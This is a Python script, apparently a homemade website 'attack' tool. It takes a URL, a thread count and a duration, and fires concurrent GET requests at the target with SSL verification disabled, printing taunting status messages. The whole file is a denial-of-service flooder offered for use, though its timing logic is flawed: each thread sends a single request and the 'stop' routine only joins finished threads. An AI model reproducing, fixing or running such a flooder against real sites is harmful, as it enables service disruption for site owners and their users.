import requests
import threading
from requests.exceptions import SSLError, ConnectionError

# Disable SSL verification warning
requests.packages.urllib3.disable_warnings()

def hit_website(url):
    try:
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            print("URAAAAAA!!")
        else:
            print("SORRY, BOSS! The request returned status code:", response.status_code)
    except SSLError as ssl_error:
        print("SORRY, BOSS! An SSL error occurred:", str(ssl_error))
    except ConnectionError as conn_error:
        print("SORRY, BOSS! A connection error occurred:", str(conn_error))
    except requests.exceptions.RequestException as e:
        print("SORRY, BOSS! An error occurred:", str(e))

def start_attack(url, num_threads, time_seconds):
    threads = []

    # Create and start the threads
    for _ in range(num_threads):
        t = threading.Thread(target=hit_website, args=(url,))
        threads.append(t)
        t.start()

    # Wait for the specified time
    threading.Timer(time_seconds, stop_attack, args=(threads,)).start()

def stop_attack(threads):
    for t in threads:
        t.join()
    
    print("Attack stopped!")

# Take inputs from the user
url = input("Enter URL: ")
num_threads = int(input("Number of threads: "))
time_seconds = int(input("Time[sec] : "))

# Start the attack
start_attack(url, num_threads, time_seconds)
